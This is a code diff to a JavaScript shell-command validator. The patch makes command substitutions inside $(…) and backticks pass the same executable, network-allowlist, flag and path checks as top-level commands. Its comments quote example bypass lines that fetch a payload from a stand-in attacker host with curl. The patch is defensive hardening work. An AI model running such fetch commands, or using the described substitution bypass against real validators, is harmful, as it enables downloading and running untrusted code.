@@ -651,8 +651,13 @@ function extractCommandSubstitutions(text) {
 }
 
 /**
- * Validates the executable name inside every command substitution found in
- * `text`.  Pushes error strings into `errors` for any unknown executable.
+ * Validates every command substitution found in `text` through the same full
+ * pipeline as top-level commands: executable allowlist, network/destructive
+ * allowlist, flag well-formedness, and local-path existence.
+ *
+ * Previously this function only checked whether the executable name was
+ * known, which let `curl https://evil.com/payload` inside `$(…)` or `\`…\``
+ * bypass the network allowlist entirely.
  *
  * @param {string}   text      — shell fragment to scan (may contain $(...)/`...`)
  * @param {string}   location  — "file:line" for error messages
@@ -661,24 +666,80 @@ function extractCommandSubstitutions(text) {
 function validateCommandSubstitutions(text, location, errors) {
   const bodies = extractCommandSubstitutions(text);
   for (const body of bodies) {
-    const bodyTrimmed = body.trim();
-    if (!bodyTrimmed) continue;
+    // Each body may itself be a compound command (e.g. `foo; bar` or `foo | bar`).
+    // Split it the same way the outer validator does so every segment is checked.
+    const segments = splitCommandSegments(body.trim());
 
-    // Tokenise the body the same way the main validator does.
-    const tokens = tokenise(bodyTrimmed);
-    if (tokens.length === 0) continue;
+    for (const segment of segments) {
+      const bodyTrimmed = segment.trim();
+      if (!bodyTrimmed) continue;
+      if (bodyTrimmed.startsWith("#")) continue;
+      if (["|", "||", "&&", ";", "\\"].includes(bodyTrimmed)) continue;
 
-    const exe = tokens[0];
+      // Strip any leading env-var assignments inside the substitution body
+      // (e.g. `$(FOO=bar curl https://evil.com)` must still catch curl).
+      let remaining = bodyTrimmed;
+      while (remaining) {
+        const envMatch = remaining.match(
+          /^([A-Za-z_][A-Za-z0-9_]*)=((?:"[^"]*"|'[^']*'|\$\([^)]*\)|`[^`]*`|\S)*)\s*/,
+        );
+        if (!envMatch) break;
 
-    // Skip variable expansions or operator tokens as the "executable".
-    if (exe.startsWith("$") || exe.startsWith("`")) continue;
-    if (["|", "||", "&&", ";", "\\"].includes(exe)) continue;
+        const varName = envMatch[1];
+        if (/^[A-Z][A-Z0-9_]*$/.test(varName) && !KNOWN_ENV_VARS.has(varName)) {
+          errors.push(
+            `${location}: undocumented environment variable '${varName}' inside command substitution — ` +
+            `add it to KNOWN_ENV_VARS in scripts/check-shell-commands.mjs if it is intentional`,
+          );
+        }
 
-    if (!KNOWN_TOOLS.has(exe)) {
-      errors.push(
-        `${location}: unknown executable '${exe}' inside command substitution — ` +
-        `add it to KNOWN_TOOLS in scripts/check-shell-commands.mjs if it is a real tool`,
-      );
+        // Recurse into the assignment value in case it contains further substitutions.
+        validateCommandSubstitutions(envMatch[2] ?? "", location, errors);
+        remaining = remaining.slice(envMatch[0].length).trim();
+      }
+
+      if (!remaining) continue;
+
+      // Tokenise the remaining command.
+      const tokens = tokenise(remaining);
+      if (tokens.length === 0) continue;
+
+      const exe = tokens[0];
+
+      // Skip variable expansions or operator tokens as the "executable".
+      if (exe.startsWith("$") || exe.startsWith("`")) continue;
+      if (["|", "||", "&&", ";", "\\"].includes(exe)) continue;
+
+      // ---- Unknown executable ----
+      if (!KNOWN_TOOLS.has(exe)) {
+        errors.push(
+          `${location}: unknown executable '${exe}' inside command substitution — ` +
+          `add it to KNOWN_TOOLS in scripts/check-shell-commands.mjs if it is a real tool`,
+        );
+        continue; // No point running further checks on an unknown tool.
+      }
+
+      // ---- Network / destructive allowlist ----
+      // Apply exactly the same check as for top-level commands: if the
+      // executable is a network/destructive tool the full command string must
+      // match one of the allowlist patterns.
+      if (isNetworkCommand(exe, tokens)) {
+        if (!NETWORK_ALLOWLIST.some((re) => re.test(remaining))) {
+          errors.push(
+            `${location}: network/destructive command not in allowlist (inside command substitution): ` +
+            `'${remaining.slice(0, 80)}' — ` +
+            `add a pattern to NETWORK_ALLOWLIST in scripts/check-shell-commands.mjs`,
+          );
+        }
+        // Don't validate flags on allowlisted network commands — shapes vary widely.
+        continue;
+      }
+
+      // ---- Flag well-formedness ----
+      errors.push(...validateFlags(exe, tokens.slice(1), location, remaining));
+
+      // ---- Local path arguments ----
+      errors.push(...validateLocalPaths(tokens.slice(1), location));
     }
   }
 }
